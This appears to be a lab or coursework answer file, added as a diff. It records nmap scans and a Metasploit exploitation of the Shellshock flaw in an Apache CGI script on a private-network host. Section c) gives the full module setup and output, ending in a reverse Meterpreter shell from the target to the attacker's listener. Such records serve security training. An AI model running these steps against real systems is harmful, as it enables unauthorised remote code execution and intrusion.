@@ -1,0 +1,180 @@
+a)
+
+nmap -A 10.10.0.35
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-11 14:27 EDT
+Nmap scan report for 10.10.0.35
+Host is up (0.0015s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds
+
+b)
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/status.cgi 10.10.0.35
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-11 15:01 EDT
+Nmap scan report for 10.10.0.35
+Host is up (0.00042s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+8080/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+|             
+|     Disclosure date: 2014-09-24
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|       http://seclists.org/oss-sec/2014/q3/685
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+20666/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     The address of main() is: 0x80001289
+|     You're in a cave with 20 rooms and 3 tunnels leading from each room.
+|     There are 3 bats and 3 pits scattered throughout the cave, and your
+|     quiver holds 5 custom super anti-evil Wumpus arrows. Good luck.
+|     room 11 of the cave, and have 5 arrows left.
+|     *whoosh* (I feel a draft from some pits).
+|     *sniff* (I can smell the evil Wumpus nearby!)
+|     There are tunnels to rooms 2, 16, and 20.
+|     Move or shoot? (m-s) I don't understand!
+|     room 11 of the cave, and have 5 arrows left.
+|     *whoosh* (I feel a draft from some pits).
+|     *sniff* (I can smell the evil Wumpus nearby!)
+|     There are tunnels to rooms 2, 16, and 20.
+|     Move or shoot? (m-s) Que pasa?
+|     room 11 of the cave, and have 5 arrows left.
+|     *whoosh* (I feel a draft from some pits).
+|     *sniff* (I can smell the evil Wumpus nearby!)
+|     There are tunnels to rooms 2, 16, and 20.
+|     Move or shoot? (m-s)
+|   NULL: 
+|     The address of main() is: 0x80001289
+|     You're in a cave with 20 rooms and 3 tunnels leading from each room.
+|     There are 3 bats and 3 pits scattered throughout the cave, and your
+|     quiver holds 5 custom super anti-evil Wumpus arrows. Good luck.
+|     room 11 of the cave, and have 5 arrows left.
+|     *whoosh* (I feel a draft from some pits).
+|     *sniff* (I can smell the evil Wumpus nearby!)
+|     There are tunnels to rooms 2, 16, and 20.
+|_    Move or shoot? (m-s)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port20666-TCP:V=7.80%I=7%D=3/11%Time=5E693598%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,1C0,"The\x20address\x20of\x20main\(\)\x20is:\x200x80001289\n\nYou'r
+SF:e\x20in\x20a\x20cave\x20with\x2020\x20rooms\x20and\x203\x20tunnels\x20l
+SF:eading\x20from\x20each\x20room\.\nThere\x20are\x203\x20bats\x20and\x203
+SF:\x20pits\x20scattered\x20throughout\x20the\x20cave,\x20and\x20your\nqui
+SF:ver\x20holds\x205\x20custom\x20super\x20anti-evil\x20Wumpus\x20arrows\.
+SF:\x20\x20Good\x20luck\.\n\nYou\x20are\x20in\x20room\x2011\x20of\x20the\x
+SF:20cave,\x20and\x20have\x205\x20arrows\x20left\.\n\*whoosh\*\x20\(I\x20f
+SF:eel\x20a\x20draft\x20from\x20some\x20pits\)\.\n\*sniff\*\x20\(I\x20can\
+SF:x20smell\x20the\x20evil\x20Wumpus\x20nearby!\)\nThere\x20are\x20tunnels
+SF:\x20to\x20rooms\x202,\x2016,\x20and\x2020\.\nMove\x20or\x20shoot\?\x20\
+SF:(m-s\)\x20")%r(GenericLines,37E,"The\x20address\x20of\x20main\(\)\x20is
+SF::\x200x80001289\n\nYou're\x20in\x20a\x20cave\x20with\x2020\x20rooms\x20
+SF:and\x203\x20tunnels\x20leading\x20from\x20each\x20room\.\nThere\x20are\
+SF:x203\x20bats\x20and\x203\x20pits\x20scattered\x20throughout\x20the\x20c
+SF:ave,\x20and\x20your\nquiver\x20holds\x205\x20custom\x20super\x20anti-ev
+SF:il\x20Wumpus\x20arrows\.\x20\x20Good\x20luck\.\n\nYou\x20are\x20in\x20r
+SF:oom\x2011\x20of\x20the\x20cave,\x20and\x20have\x205\x20arrows\x20left\.
+SF:\n\*whoosh\*\x20\(I\x20feel\x20a\x20draft\x20from\x20some\x20pits\)\.\n
+SF:\*sniff\*\x20\(I\x20can\x20smell\x20the\x20evil\x20Wumpus\x20nearby!\)\
+SF:nThere\x20are\x20tunnels\x20to\x20rooms\x202,\x2016,\x20and\x2020\.\nMo
+SF:ve\x20or\x20shoot\?\x20\(m-s\)\x20I\x20don't\x20understand!\n\nYou\x20a
+SF:re\x20in\x20room\x2011\x20of\x20the\x20cave,\x20and\x20have\x205\x20arr
+SF:ows\x20left\.\n\*whoosh\*\x20\(I\x20feel\x20a\x20draft\x20from\x20some\
+SF:x20pits\)\.\n\*sniff\*\x20\(I\x20can\x20smell\x20the\x20evil\x20Wumpus\
+SF:x20nearby!\)\nThere\x20are\x20tunnels\x20to\x20rooms\x202,\x2016,\x20an
+SF:d\x2020\.\nMove\x20or\x20shoot\?\x20\(m-s\)\x20Que\x20pasa\?\n\nYou\x20
+SF:are\x20in\x20room\x2011\x20of\x20the\x20cave,\x20and\x20have\x205\x20ar
+SF:rows\x20left\.\n\*whoosh\*\x20\(I\x20feel\x20a\x20draft\x20from\x20some
+SF:\x20pits\)\.\n\*sniff\*\x20\(I\x20can\x20smell\x20the\x20evil\x20Wumpus
+SF:\x20nearby!\)\nThere\x20are\x20tunnels\x20to\x20rooms\x202,\x2016,\x20a
+SF:nd\x2020\.\nMove\x20or\x20shoot\?\x20\(m-s\)\x20");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 173.16 seconds
+
+c)
+msf5 > search shellshock
+
+Matching Modules
+================
+
+   #   Name                                               Disclosure Date  Rank       Check  Description
+   -   ----                                               ---------------  ----       -----  -----------
+   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
+   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
+   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
+   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
+   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
+   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
+   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
+   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
+   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
+
+msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOST 10.10.0.35
+RHOST => 10.10.0.35
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPORT 8080
+RPORT => 8080
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI cgi-bin/status.cgi
+TARGETURI => cgi-bin/status.cgi
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.0.10
+LHOST => 10.10.0.10
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting     Required  Description
+   ----            ---------------     --------  -----------
+   CMD_MAX_LENGTH  2048                yes       CMD max line length
+   CVE             CVE-2014-6271       yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent          yes       HTTP header to use
+   METHOD          GET                 yes       HTTP method to use
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS          10.10.0.35          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin                yes       Target PATH for binaries used by the CmdStager
+   RPORT           8080                yes       The target port (TCP)
+   SRVHOST         0.0.0.0             yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT         8080                yes       The local port to listen on.
+   SSL             false               no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI       cgi-bin/status.cgi  yes       Path to CGI script
+   TIMEOUT         5                   yes       HTTP read response timeout (seconds)
+   URIPATH                             no        The URI to use for this exploit (default is random)
+   VHOST                               no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.0.10:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (985320 bytes) to 10.10.0.35
+[*] Meterpreter session 1 opened (10.10.0.10:4444 -> 10.10.0.35:56709) at 2020-03-11 17:11:59 -0400
+
+meterpreter > getuid
+Server username: uid=33, gid=33, euid=33, egid=33
+meterpreter > 
+
